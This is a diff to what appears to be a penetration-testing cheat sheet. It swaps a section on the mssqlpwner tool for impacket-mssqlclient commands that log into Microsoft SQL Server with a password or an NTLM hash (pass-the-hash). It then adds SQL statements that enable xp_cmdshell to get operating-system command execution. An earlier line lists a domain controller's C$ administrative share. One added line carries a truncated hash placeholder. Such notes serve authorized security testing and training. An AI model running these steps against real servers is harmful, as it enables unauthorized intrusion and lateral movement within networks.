@@ -163,15 +163,17 @@ Then cmd here:
 ```
 dir \\DC01\c$
 ```
-## mssqlpwner
-Once you have this bad boy installed, you can RCE mssql with hashes or passwords. Command:
-
+## impacket-mssqlclient
 ```
-mssqlpwner user:password@target_ip -windows-auth
+impacket-mssqlclient username:password@target_ip
+impacket-mssqlclient domain/username@target_ip -hashes LMHASH:NTHAS
 ```
-Or pass the hash:
+Then run these commands in order:
 ```
-mssqlpwner user@target_ip -hashes LMHASH:NTHASH
+EXEC sp_configure 'show advanced options', 1;
+RECONFIGURE;
+EXEC sp_configure 'xp_cmdshell', 1;
+RECONFIGURE;
 ```
 
 ## Tools
